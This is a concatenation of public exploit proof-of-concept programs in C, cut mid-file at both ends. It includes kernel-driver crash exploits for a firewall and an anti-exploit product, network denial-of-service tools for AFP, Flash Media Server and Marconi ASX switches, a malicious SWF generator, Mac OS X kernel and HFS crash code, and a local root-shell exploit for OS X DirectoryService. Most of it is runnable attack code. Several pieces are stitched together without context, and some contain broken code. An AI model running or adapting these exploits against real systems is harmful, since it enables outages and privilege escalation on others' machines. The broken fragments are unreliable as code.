    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();

    printf("- send a query of 7 bytes for causing the crash\n");
    send(sd, BOOM, sizeof(BOOM) - 1, 0);
    if(timeout(sd, 5) || (recv(sd, buff, sizeof(buff), 0) <= 0)) {
        printf("\n  Server IS vulnerable!!!\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n");
    }
    close(sd);
    return(0);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>

/*
Program          : Look 'n' Stop 2.06p4 / 2.07 (6.0.2900.5512)
Homepage         : http://www.looknstop.com
Discovery        : 2009/11/08
Author Contacted : 2010/07/15 ... no reply
Found by         : Heurs
This Advisory    : Heurs
Contact          : s.leberre@sysdream.com


//----- Application description

Look 'n' Stop Firewall 2.07 provides key features to protect your computer
against cyber threats. It prevents malicious programs from transmitting the
data of your computer to hacker's computers. Look 'n' Stop Firewall 2.07
also protects your computer from external intrusions.

//----- Description of vulnerability

lnsfw1.sys driver generate a BSOD with particular value of IOCTL. Kernel wait
an action with a kernel debugger.

//----- Credits

http://www.sysdream.com
http://www.hackinparis.com/
http://ghostsinthestack.org

s.leberre at sysdream dot com
heurs at ghostsinthestack dot org

*/

int __cdecl main(int argc, char* argv[])
{
    HANDLE hDevice = (HANDLE) 0xffffffff;
    DWORD NombreByte;
    DWORD Crashing[] = {
        0x200ff822, 0xd24b37a1, 0x8ce055dc, 0x70b3d269,
        0x3d2ef498, 0xcdd0e57c, 0xf2699fab, 0xed753dcb,
        0xfdde2a99, 0x90590b61, 0x28011112, 0xeb35191c,
        0x36f0e1e7, 0xef7ee764, 0x09b01e1f, 0x0bb86825,
        0x1b886612, 0xd8c289df, 0xaa21ad45, 0x6fa7a76d,
        0x13492a54, 0x7c2bc443, 0x65dbf582, 0xffeb86cc,
        0xf48ca4fd, 0x75542bb5, 0xd05638ba, 0x3876e368,
        0x678ba399, 0x6779f15c, 0x8f89ff55, 0xc8b9cf02,
        0x033b9857, 0x82eef1a9, 0xf0dba3b6, 0xadf5b8f6,
        0x033ef961, 0x393f043b, 0x515896fd, 0x28d10e25,
        0x37b7f707, 0x1a425f92, 0x4bc6acfb, 0x45390605,
        0x0be40107, 0xf121a706, 0x4b4c0e31, 0x88889f12,
        0x0c60806d, 0x03af4569, 0xe5b68798, 0xb22bd966,
        0xd532fe7f, 0x19a7213a, 0x6927f7f5, 0xcd4c3202,
        0x96831f6b, 0x1d09991d, 0x48d1da67, 0x68f24415,
        0xbb01a216, 0xdb6b634a, 0x18e36cb4, 0xcd7265c2,
        0x64b81111, 0x4305d1b3, 0xc4f1ee8d, 0xfcd61343,
        0xb8bfc8b9, 0x8a1a5541, 0xe9c3adcb, 0xca4c2a56,
        0x89a67e7d, 0x74b8704e, 0xfe70e4d6, 0x27612082,
        0xd8e211d7, 0x190ec39c, 0x380dfc09, 0x8d649b0c,
        0xeda15e23, 0xe2e76319, 0xc781f249, 0x4cb25434,
        0xeff3dc6a, 0xa0a6e976, 0x57014474, 0x98629b36,
        0x2cc9fb9d, 0xa6a8b31b, 0xa3fbef44, 0xfeb130d3,
        0x91e8c96b, 0xdc953762, 0x77341f7c, 0xd4ec9d26,
        0x8504a663, 0x1da0406a, 0x8a049adf, 0x0f2ca8ef,
        0xbc93ec1e, 0x027bdfad, 0x4c8885f6, 0x1c30be98,
        0x0ec01493, 0x124d4252, 0x0765f8c1, 0x801652da,
        0x778a6e6a, 0x09ef17aa, 0x6ece13fd, 0xa7280f9c,
        0xcf6235f9, 0xabdeae81, 0x8145979e, 0x45af7871,
        0xed3d36e0, 0x9e223b88, 0xfe26e7f2, 0xe13743f1,
        0xa8171a6e, 0x611c303f, 0x252a68d2, 0xd013e026,
        0x1259b868, 0xf673c420, 0x27a60840, 0xd87eed92,
        0xef872203, 0x26868592, 0x18324bc9, 0xed47e068,
        0xf2c0b162, 0x95966d8e, 0x07cc53db, 0xe8360489,
        0x7c630b42, 0x8ab52dd9, 0xc5bf0c0e, 0xae8a8284,
        0x97a0a5ab, 0x0cccb1c4, 0x4d768275, 0x1101e67e,
        0x16e2f2c3, 0x82b7686a, 0x5b26314e, 0x52f74f38,
        0xcb341107, 0xa59c70d0, 0x3327af19, 0xdd51188f,
        0x54636221, 0xa05f288a, 0xeb7d4a3a, 0x2065885d,
        0xb103190e, 0xd36e7e1e, 0xf7a7d560, 0xc62c828d,
        0x9fc687e9, 0xcf609352, 00e96253
        };
    BYTE Out[0x20];
    
    printf("0day Local DoS - Look 'n' Stop 2.06p4\n\n");
    hDevice = CreateFile("\\\\.\\LNSFW1",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    printf("%x\n",hDevice);
    
    DeviceIoControl(hDevice,0x80000064,Crashing,0x28b,0,0,&NombreByte,NULL);
    
    printf("Sploit Send.\n\n");
    CloseHandle(hDevice);
    getch();
    return 0;
}


/*
 * 2015, Maxime Villard, CVE-2015-1100
 * Local DoS caused by a missing limit check in the fat loader of the Mac OS X
 * Kernel.
 *
 *  $ gcc -o Mac-OS-X_Fat-DoS Mac-OS-X_Fat-DoS.c
 *  $ ./Mac-OS-X_Fat-DoS BINARY-NAME
 *
 * Obtained from: http://m00nbsd.net/garbage/Mac-OS-X_Fat-DoS.c
 * Analysis:      http://m00nbsd.net/garbage/Mac-OS-X_Fat-DoS.txt
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <spawn.h>
#include <unistd.h>
#include <err.h>
#include <mach-o/fat.h>
#include <sys/stat.h>

#define MAXNUM (4096)
#define MAXNUM0 (OSSwapBigToHostInt32(MAXNUM))

void CraftBinary(char *name)
{
  struct fat_header fat_header;
  struct fat_arch *arches;
  size_t i;
  int fd;

  memset(&fat_header, 0, sizeof(fat_header));
  fat_header.magic = FAT_MAGIC;
  fat_header.nfat_arch = 4096;

  if ((arches = calloc(MAXNUM0, sizeof(struct fat_arch))) == NULL)
    err(-1, "calloc");
  for (i = 0; i < MAXNUM0; i++)
    arches[i].cputype = CPU_TYPE_I386;

  if ((fd = open(name, O_CREAT|O_RDWR)) == -1)
    err(-1, "open");
  if (write(fd, &fat_header, sizeof(fat_header)) == -1)
    err(-1, "write");
  if (write(fd, arches, sizeof(struct fat_arch) * MAXNUM0) == -1)
    err(-1, "write");
  if (fchmod(fd, S_IXUSR) == -1)
    err(-1, "fchmod");
  close(fd);
  free(arches);
}

void SpawnBinary(char *name)
{
  cpu_type_t cpus[] = { CPU_TYPE_HPPA, 0 };
  char *argv[] = { "Crazy Horse", NULL };
  char *envp[] = { NULL };
  posix_spawnattr_t attr;  
  size_t set = 0;
  int ret;

  if (posix_spawnattr_init(&attr) == -1)
    err(-1, "posix_spawnattr_init");
  if (posix_spawnattr_setbinpref_np(&attr, 2, cpus, &set) == -1)
    err(-1, "posix_spawnattr_setbinpref_np");
  fprintf(stderr, "----------- Goodbye! -----------\n");
  ret = posix_spawn(NULL, name, NULL, &attr, argv, envp);
  fprintf(stderr, "Hum, still alive. You are lucky today! ret = %d\n", ret);
}

int main(int argc, char *argv[])
{
  if (argc != 2) {
    printf("Usage: %s BINARY-NAME\n", argv[0]);
  } else {
    CraftBinary(argv[1]);
    SpawnBinary(argv[1]);
  }
}/*
* DoS for Darwin Kernel Version < 7.5.0
* -(nemo pulltheplug org)-
* 2005
*
* greetz to awnex, cryp, nt, andrewg, arc, mercy, amnesia ;)
* irc.pulltheplug.org (#social)
*/


#include <stdio.h>

int main( int ac, char * * av )
{
  FILE * me;
  int rpl = 0xffffffff;
  fpos_t pos = 0x10;
  printf( "-( nacho - 2004 DoS for OSX (darwin < 7.5.0 )-\n" );
  printf( "-( nemo pulltheplug org )-\n\n" );
  printf( "[+] Opening file for writing.\n" );
  if ( !( me = fopen( * av, "r+" ) ) )
  {
    printf( "[-] Error opening exe.\n" );
    exit( 1 );
  }
  printf( "[+] Seeking to ncmds.\n" );
  if ( ( fsetpos( me, & pos ) ) == -1 )
  {
    printf( "[-] Error seeking to ncmds.\n" );
    exit( 1 );
  }
  printf( "[+] Changing ncmds to 0x%x.\n", rpl );
  if ( fwrite( & rpl, 4, 1, me ) < 1 )
  {
    printf( "[-] Error writing to file.\n" );
    exit( 1 );
  }
  fclose( me );
  printf( "[+] Re-executing with modified mach-o header.\n" );
  sleep( 5 );
  if ( execv( * av, av ) == -1 )
  {
    printf( "[-] Error executing %s, please run manually.\n", * av );
    exit( 1 );
  }
  exit( 0 ); // hrm
}

// milw0rm.com [2005-01-20]
/* [ fm-afp.c ]
* -( nemo @ felinemenace.org )- 2005
*
* Code for afp bug found by Braden Thomas.
*
* Again hello to everyone @ irc.pulltheplug.org
*
* need a challenge? -( http://pulltheplug.org )-
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>

#define UAMSIZE    1022
#define AFPVERSIZE 5
#define PATHSIZE   30
#define UASIZE     30
#define AFPNSIZE   5
#define AFPPORT    548
#define BUFSIZE sizeof(dsi)+sizeof(fploginext) //+LEN+sizeof(afpEnd)

typedef struct { char AFPVER[AFPVERSIZE]  ;} AFPVER_T;
typedef struct { char UAM[UAMSIZE]        ;} UAM_T;
typedef struct { char PATH[PATHSIZE]      ;} PATH_T;
typedef struct { char UserAuthInfo[UASIZE];} UserAuth_t;
typedef struct { char AFPName[AFPNSIZE]   ;} AFPName_t;

typedef struct dsi { // Data Stream Interface.
       u_int8_t  req;
       u_int8_t  com;
       u_int16_t id;
       u_int32_t offset;
       u_int32_t len;
       u_int32_t reserved;
} DSI_T;

typedef struct FPLoginExt { // Establishes a session with a server using an Open Directory domain.
       u_int8_t   command;
       u_int8_t   pad;
       u_int16_t  flags;
       AFPVER_T   AFPVER;
       UAM_T      UAM;
       u_int8_t   UserNameType;
       AFPName_t  UserName;
       u_int8_t   PathType;
       PATH_T     Pathname;
       u_int8_t   pad2;
       UserAuth_t UserAuthInfo;
} FP_LoginExt_T;

DSI_T dsi;
FP_LoginExt_T fploginext;

void banner()
{
       printf(" [ fm-afp.c ]\n");
       printf("-( nemo@felinemenace.org )-\n\n");
}

void usage(char *progname)
{
       printf("usage: %s <ip address>.\n",progname);
       exit(1);
}

int connect_afp(char *ip,int *sockfd)
{
       struct sockaddr_in target_addr;
       int len;

       *sockfd = socket(AF_INET, SOCK_STREAM, 0);

       target_addr.sin_family = AF_INET;
       target_addr.sin_port = htons(AFPPORT);
       inet_aton(ip, &(target_addr.sin_addr));
       memset(&(target_addr.sin_zero), '\0', 8);

       if (connect(*sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1) {
               return 1;
       }
       return 0;
}

void generate_packet(char *packet)
{
       int n;

       dsi.req       = '\x00';
       dsi.com       = '\x02';
       dsi.id        = (u_int16_t)0x0002;
       dsi.offset    = 0x00000000;
       dsi.len       = 0x00000434;
       dsi.reserved  = 0x00000000;

       fploginext.command = (u_int8_t)'\x3f';
       fploginext.pad     = (u_int8_t)'\x00';
       fploginext.flags   = (u_int16_t)0x0000;
       memcpy((char *)&(fploginext.AFPVER),"\x04\x6e\x65\x6d\x6f",5);
       memset((char*)((&fploginext.UAM)),'\x70',sizeof(fploginext.UAM));
       fploginext.UAM.UAM[0] = '\x0f';
       fploginext.UAM.UAM[1] = '\xff';
       fploginext.UAM.UAM[257] = '\xff';               //      size of next string.
       fploginext.UAM.UAM[258] = '\xff';               //
       fploginext.UAM.UAM[500] = '\x00';               //      size of next string.
       fploginext.UAM.UAM[501] = '\xf0';               //

       fploginext.UserNameType = (u_int8_t)'\x11';
       memcpy((char *)&(fploginext.UserName),"\x54\x6e\x65\x6d\x6f",5);
       fploginext.PathType = (u_int8_t)'\xff';
       memcpy((char *)&(fploginext.Pathname),"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",30);
       fploginext.pad2 = (u_int8_t)'\xff';
       memcpy((char *)&(fploginext.UserAuthInfo),"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",30);

       memcpy(packet, &dsi, sizeof(dsi));
       packet += sizeof(dsi);
       memcpy(packet, &fploginext, sizeof(fploginext));
}

int send_packet(char *packet,int *sockfd)
{
       if (send(*sockfd, packet, BUFSIZE, 0) == -1) {
               return 1;
       }

       return 0;
}

int main(int ac, char **av)
{
       int sockfd;
       char packet[BUFSIZE];
       struct timeval time;

       banner();
       if(ac != 2) {
               usage(*av);
       }
       printf("[+] Connecting to target: %s.\n",av[1]);
       if(connect_afp(av[1],&sockfd)) {
               printf("[-] An error has occured connecting to the target.\n");
               exit(1);
       }

       printf("[+] Generating malicious packet.\n");
       generate_packet(packet);

       printf("[+] Sending packet to target.\n");
       if(send_packet(packet,&sockfd)) {
               printf("[-] Error sending packet.\n");
               close(sockfd);
               exit(1);
       }

       fd_set mySet;
       FD_ZERO(&mySet);
       FD_SET(sockfd, &mySet);
       time.tv_sec = 0;
       time.tv_usec = 50;
       select(sockfd+1, &mySet, NULL, NULL, &time);

       close(sockfd);
       return 0;
}

// milw0rm.com [2005-02-08]
// -----BEGIN PGP SIGNED MESSAGE-----
// Hash: SHA1
/* 	Proof of Concept for CVE-2010-0105
	MacOS X 10.6 hfs file system attack (Denial of Service)
	by Maksymilian Arciemowicz from SecurityReason.com

	http://securityreason.com/achievement_exploitalert/15
	
	NOTE:
	
	This DoS will be localized in phase
	
	Checking multi-linked directories

	So we need activate it with line
	
		connlink("C/C","CX");

	Now we need create PATH_MAX/2 directory tree to make overflow.

	and we should get diskutil and fsck_hfs exit with sig=8
	
	~ x$ diskutil verifyVolume /Volumes/max2
	Started filesystem verification on disk0s3 max2
	Performing live verification
	Checking Journaled HFS Plus volume
	Checking extents overflow file
	Checking catalog file
	Checking multi-linked files
	Checking catalog hierarchy
	Checking extended attributes file
	Checking multi-linked directories
	Maximum nesting of folders and directory hard links reached
	The volume max2 could not be verified completely
	Error: -9957: Filesystem verify or repair failed
	Underlying error: 8: POSIX reports: Exec format error
	
		
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/types.h>


int createdir(char *name){
	if(0!=mkdir(name,((S_IRWXU | S_IRWXG | S_IRWXO) & ~umask(0))| S_IWUSR
|S_IXUSR)){
		printf("Can`t create %s", name);
		exit(1);}
		else
		return 0;	
}

int comein(char *name){
	if(0!=chdir(name)){
		printf("Can`t chdir in to %s", name);
		exit(1);}
		else
		return 0;	
}

int connlink(a,b)
char *a,*b;
{
	if(0!=link(a,b)){
		printf("Can`t create link %s => %s",a,b);
		exit(1);}
		else
		return 0;	
}

int main(int argc,char *argv[]){
	
 	int level;
	FILE *fp;
	
	if(argc==2) {
		level=atoi(argv[1]);
	}else{
		level=512; //default
	}
	createdir("C"); //create hardlink
	createdir("C/C"); //create hardlink
	
	connlink("C/C","CX"); //we need use to checking multi-linked directorie

	comein("C");
	
	while(level--)
			printf("Level: %i mkdir:%i chdir:%i\n",level,
			createdir("C"),
			comein("C"));		
	
	
	printf("check diskutil verifyVolume /\n");
	return 0;
}
/*
- -- 
Best Regards,
- ------------------------
pub   1024D/A6986BD6 2008-08-22
uid                  Maksymilian Arciemowicz (cxib)
<cxib@securityreason.com>
sub   4096g/0889FA9A 2008-08-22

http://securityreason.com
http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
-----BEGIN PGP SIGNATURE-----

iEYEARECAAYFAkvTTQsACgkQpiCeOKaYa9bHwACfSRqy8xJbJBGFvLbLIjabxMkI
to4AoMMetii9Gc7EyOK7/3+QP4ynP5kY
=IML/
-----END PGP SIGNATURE-----
*/source: http://www.securityfocus.com/bid/7323/info

MacOSX DirectoryService has been reported prone to a denial of service vulnerability.

It has been reported that a remote attacker may trigger an exception in
DirectoryService by repeatedly connecting to specific network ports. 

/* 
   OS X <= 10.2.4 DirectoryService local root PATH exploit
   DirectoryService must be crashed prior to execution, per
   @stake advisory.  If you discover how to crash DirectoryService
   e-mail me at neeko@haackey.com  [Neeko Oni]

[Copying and pasting code does not make you cool, no matter how many
dollars per hour you make.  Sorry.]

--
Assuming DirectoryService has been crashed/killed, compile
this code as 'touch' (gcc osxds.c -o touch) and execute.

bash$ ./touch
*bunch of stuff here*
euid is root.
bash#

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int 
main(int argc, char **argv)
{
	char           *ORIGPATH;
	int             temp;
	if (argc < 2) {
		if (geteuid() == 0) {
		printf("euid is root.\n");
		setuid(0);
		execl("/bin/bash", "bash", NULL);
		}
		strcpy(ORIGPATH, getenv("PATH"));
		printf("Original path: %s\n", ORIGPATH);
		setenv("PATH", ".", 1);
		printf("New path: %s\n", getenv("PATH"));
		printf("Executing DirectoryService with false PATH...\n");
		if (fork() == 0) {
			execl("/usr/sbin/DirectoryService", "DirectoryService", NULL);
		}
		printf("Forked DirectoryService, pausing before shell exec...\n");
		sleep(3);
		printf("Cross your fingers.\n");
		setenv("PATH", ORIGPATH, 1);
		printf("Path restored: %s\n", getenv("PATH"));
		execl("./touch", "touch", NULL);		
	}
system("/usr/sbin/chown root ./touch;/bin/chmod +s ./touch");
}
/*****************************************************************

Macromedia Flash Media Server 2 Remote D.o.S Exploit by Kozan

Application: Macromedia Flash Media Server
http://www.macromedia.com/software/flashmediaserver/
Vendor: Macromedia

Discovered by:  dr_insane
Exploit Coded by: Kozan
Credits to ATmaCA,  dr_insane
Web: www.spyinstructors.com
Mail: kozan@spyinstructors.com

*****************************************************************/

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib,"ws2_32.lib")

int nDefaultPort = 1111;

char SingleDoSChar[] = "\x41";

int main(int argc, char *argv[])
{
       fprintf(stdout, "\n\nMacromedia Flash Media Server 2 Remote D.o.S Exploit by Kozan\n");
       fprintf(stdout, "Bug Discovered by:  dr_insane\n");
       fprintf(stdout, "Exploit Coded by: Kozan\n");
       fprintf(stdout, "Credits to ATmaCA,  dr_insane\n");
       fprintf(stdout, "www.spyinstructors.com - kozan@spyinstructors.com\n\n");

       if(argc<2)
       {
               fprintf(stderr, "Usage: %s [Target IP]\n\n", argv[0]);
               return -1;
       }
       WSADATA wsaData;
       SOCKET sock;

       if( WSAStartup(0x0101,&wsaData) < 0 )
       {
               fprintf(stderr, "Winsock error!\n");
               return -1;
       }

       sock = socket(AF_INET,SOCK_STREAM,0);
       if( sock == -1 )
       {
               fprintf(stderr, "Socket error!\n");
               return -1;
       }

       struct sockaddr_in addr;

       addr.sin_family = AF_INET;
       addr.sin_port = htons(nDefaultPort);
       addr.sin_addr.s_addr = inet_addr(argv[1]);
       memset(&(addr.sin_zero), '\0', 8);

       fprintf(stdout, "Please wait while connecting to server...\n");

       if( connect( sock, (struct sockaddr*)&addr, sizeof(struct sockaddr) ) == -1 )
       {
               fprintf(stderr, "Connection failed!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Please wait while sending single DoS char...\n");

       if( send(sock,SingleDoSChar,lstrlen(SingleDoSChar),0) == -1 )
       {
               fprintf(stderr, "DoS char could not sent!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Operation completed...\n");
       closesocket(sock);
       WSACleanup();

       return 0;
}

// milw0rm.com [2005-12-14]
/*
 
 * ********************************************************* *
 * Macromedia Flash Plugin - Buffer Overflow in flash.ocx    *
 * ********************************************************* *
 * Version: v7.0.19.0                                        *
 * PoC coded by: BassReFLeX                                  *
 * Date: 11 Oct 2005                                         *
 * ********************************************************* *
 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void usage(char* file);

/*
<swf>
...
</swf>
*/
char SWF[] = "<swf>";
char SWF_[] = "</swf>";

//[SetBackgroundColor]
char SetBackgroundColor[] = "\x43\x02\xff\x00\x00";

//[DoAction] 1 pwn j00r 455!
char DoAction[] = "\x3c\x03\x9b\x08\x00\x41\x41\x41\x41\x41\x41\x41\x41\x00\x40\x00"
		  "\x42\x42\x42\x42\x42\x42\x42\x42\x00\x43\x43\x43\x43\x43\x43\x43"
                  "\x43\x00\x44\x44\x44\x44\x44\x44\x44\x44\x00\x45\x45\x45\x45\x45"
                  "\x45\x45\x45\x00\x46\x46\x46\x46\x46\x46\x46\x46\x00\x00";

//[ShowFrame]
char ShowFrame[] = "\x40\x00";

//[End]
char End[] = "\x00\x00";

int main(int argc,char* argv[])
{
    system("cls");
    printf("\n* ********************************************************* *");
    printf("\n* Macromedia Flash Plugin - Buffer Overflow in flash.ocx    *");
    printf("\n* ********************************************************* *");
    printf("\n* Version: v7.0.19.0                                        *");
    printf("\n* Date: 11 Oct 2005                                         *");
	printf("\n* ProofOfConcept(POC) coded by: BassReFLeX                  *");
    printf("\n* ********************************************************* *");
    
    if ( argc!=2 )
    {
        usage(argv[0]);
    }
    
    FILE *f;
    f = fopen(argv[1],"w");
    if ( !f )
    {
        printf("\nFile couldn't open!");
        exit(1);
    }
                         
    printf("\n\nWriting crafted .swf file . . .");
    fwrite(SWF,1,sizeof(SWF),f);
    fwrite("\n",1,1,f);
    fwrite(SetBackgroundColor,1,sizeof(SetBackgroundColor),f);
    fwrite("\n",1,1,f);
    fwrite(DoAction,1,sizeof(DoAction),f);
    fwrite("\n",1,1,f);
	fwrite(ShowFrame,1,sizeof(ShowFrame),f);
    fwrite("\n",1,1,f);
	fwrite(End,1,sizeof(End),f);
	fwrite("\n",1,1,f);
	fwrite(SWF_,1,sizeof(SWF_),f);
	printf("\nFile created successfully!");
    printf("\nFilename: %s",argv[1]);
    return 0;
}        

void usage(char* file)
{
    printf("\n\n");
    printf("\n%s <Filename>",file);
    printf("\n\nFilename = .swf crafted file. Eg: overflow.swf");
    exit(1);
}

// milw0rm.com [2005-11-18]
/*

Exploit Title    - MalwareBytes Anti-Exploit Out-of-bounds Read DoS
Date             - 19th January 2015
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - https://www.malwarebytes.org
Tested Version   - 1.03.1.1220, 1.04.1.1012
Driver Version   - no version set - mbae.sys
Tested on OS     - 32bit Windows XP SP3 and Windows 7 SP1
OSVDB            - http://www.osvdb.org/show/osvdb/114249
CVE ID           - CVE-2014-100039
Vendor fix url   - https://forums.malwarebytes.org/index.php?/topic/158251-malwarebytes-anti-exploit-hall-of-fame/
Fixed version    - 1.05
Fixed driver ver - no version set

*/



#include <stdio.h>
#include <windows.h>

#define BUFSIZE 25


int main(int argc, char *argv[]) 
{
    HANDLE         hDevice;
    char           devhandle[MAX_PATH];
    DWORD          dwRetBytes = 0;
    BYTE           sizebytes[4] = "\xff\xff\xff\x00";   
    BYTE           *inbuffer;


    printf("-------------------------------------------------------------------------------\n");
    printf("        MalwareBytes Anti-Exploit (mbae.sys) Out-of-bounds Read DoS            \n");
    printf("             Tested on Windows XP SP3/Windows 7 SP1 (32bit)                    \n");
    printf("-------------------------------------------------------------------------------\n\n");

    sprintf(devhandle, "\\\\.\\%s", "ESProtectionDriver");

    inbuffer = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    memset(inbuffer, 0x41, BUFSIZE);
    memcpy(inbuffer, sizebytes, sizeof(sizebytes));

    printf("\n[i] Size of total buffer being sent %d bytes", BUFSIZE);

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
    
    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("\n[-] Open %s device failed\n\n", devhandle);
        return -1;
    }
    else 
    {
        printf("\n[+] Open %s device successful", devhandle);
    }	

    printf("\n[~] Press any key to DoS . . .");
    getch();

    DeviceIoControl(hDevice, 0x0022e000, inbuffer, BUFSIZE, NULL, 0, &dwRetBytes, NULL);

    printf("\n[+] DoS buffer sent\n\n");
 
    CloseHandle(hDevice);

    return 0;
}source: http://www.securityfocus.com/bid/2400/info

ASX-1000 Switches are hardware packages developed by Marconi Corporation. ASX-1000 Switches can be used to regulate ATM networks, performing layer-3 switching.

A problem with the switch could allow a management denial of service. The problem occurs in the handling of arbitrary packets with both the SYN-FIN flags set, and fragments. By sending packets of this nature, the services listening on the switch enter close_wait status, and do not reset until the port is reset or the switch is power cycled.

This makes it possible for a malicious user to deny administrative access to a switch, and potentially create a network interruption by creating a neccessity to power cycle the switch.

This problem affects firmware Forethought 6.2. 

/*
This DoS attack was discovered by Keith Pachulski and written by J.K. Garvey. This simple program sets the SYN, FIN and More Fragment bits and sends this crafted packet from a spoofed host to a destined Fore/Marconi ASX switch, which causes it to crash. I have no idea if this works, but it does what Keith Pachulski described. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define IP_MF 0x2000		/* More fragment bits */

void                forge (unsigned int, unsigned int, unsigned short); 
unsigned short      in_cksum (unsigned short *, int);
unsigned int        host_convert (char *);
void                usage (char *);

main (int argc, char **argv)
{
	unsigned int        source_host = 0, dest_host = 0;
	unsigned short      source_port = 0, dest_port = 80;
	int                 input;
	char                desthost[16], srchost[16];

	printf ("\nDenial of Service attack for Fore/Marconi ASX Switches\n");
	printf
		("Found by Keith Pachulski <keithp@corp.ptd.net>\nExploit written by J.K. Garvey <jim@trig.org>\n");

	if (getuid () != 0)
	{
		printf
			("\nRoot is required. Duh.\n");
		exit (0);
	}

	if (argc < 5)
	{
		usage (argv[0]);
		exit (0);
	}

        while ((input = getopt (argc, argv, "s:d:p:")) != -1)
	{
		switch (input)
		{
			case 's':
				source_host = host_convert (optarg);
				strncpy (srchost, optarg, 16);
			break;

			case 'd':
				dest_host = host_convert (optarg);
				strncpy (desthost, optarg, 16);
			break;

			case 'p':
				dest_port = atoi(optarg);
			break;
		}
	}

	forge (source_host, dest_host, dest_port); 
	printf ("\nCrafted packet sent!\n");

	exit (0);
}

void
forge (unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port) 
{
	struct send
	{
		struct iphdr        ip;
		struct tcphdr       tcp;
	}
	send;

	/* From synhose.c by knight */
	struct pseudo_header
	{
		unsigned int        source_address;
		unsigned int        dest_address;
		unsigned char       placeholder;
		unsigned char       protocol;
		unsigned short      tcp_length;
		struct tcphdr       tcp;
	}
	pseudo_header;

	int                 ch;
	int                 send_socket;
	int                 recv_socket;
	struct sockaddr_in  sin;
	char               *input;

	srand ((getpid ()) * (dest_port));

	/* Begin forged IP header */
	send.ip.ihl = 5;
	send.ip.version = 4;
	send.ip.tos = 0;
	send.ip.tot_len = htons (40);
	send.ip.id = (int) (255.0 * rand () / (RAND_MAX + 1.0));

	/* Note more fragments bit has been set */
	send.ip.frag_off = htons (IP_MF);

	send.ip.ttl = 64;
	send.ip.protocol = IPPROTO_TCP;
	send.ip.check = 0;
	send.ip.saddr = source_addr;
	send.ip.daddr = dest_addr;

	/* Begin forged TCP header */
	send.tcp.source = 1 + (int) (25.0 * rand () / (RAND_MAX + 1.0));
	send.tcp.seq = 1 + (int) (10000.0 * rand () / (RAND_MAX + 1.0));

	send.tcp.dest = htons (dest_port);
	send.tcp.ack_seq = 0;
	send.tcp.res1 = 0;
	send.tcp.doff = 5;

	/* Note FIN and SYN flags are set */
	send.tcp.fin = 1;
	send.tcp.syn = 1;

	send.tcp.rst = 0;
	send.tcp.psh = 0;
	send.tcp.ack = 0;
	send.tcp.urg = 0;
	send.tcp.window = htons (512);
	send.tcp.check = 0;
	send.tcp.urg_ptr = 0;

	/* Drop our forged data into the socket struct */
	sin.sin_family = AF_INET;
	sin.sin_port = send.tcp.source;
	sin.sin_addr.s_addr = send.ip.daddr;

	/* Now open the raw socket for sending */
	send_socket = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (send_socket < 0)
	{
		perror ("Send socket cannot be opened.");
		exit (1);
	}

	/* Make IP header checksum */
	send.ip.check = in_cksum ((unsigned short *) &send_tcp.ip, 20);

	/* Final preparation of the full header */

	/* From synhose.c by knight */
	pseudo_header.source_address = send.ip.saddr;
	pseudo_header.dest_address = send.ip.daddr;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons (20);

	bcopy ((char *) &send.tcp, (char *) &pseudo_header.tcp, 20);
	/* Final checksum on the entire package */
	send.tcp.check = in_cksum ((unsigned short *) &pseudo_header, 32);
	/* Away we go.... */
	sendto (send_socket, &send, 40, 0,
		(struct sockaddr *) &sin, sizeof (sin));
	close (send_socket);
}

unsigned short
in_cksum (unsigned short *ptr, int nbytes)
{
	register long       sum;	/* assumes long == 32 bits */
	u_short             oddbyte;
	register u_short    answer;	/* assumes u_short == 16 bits */

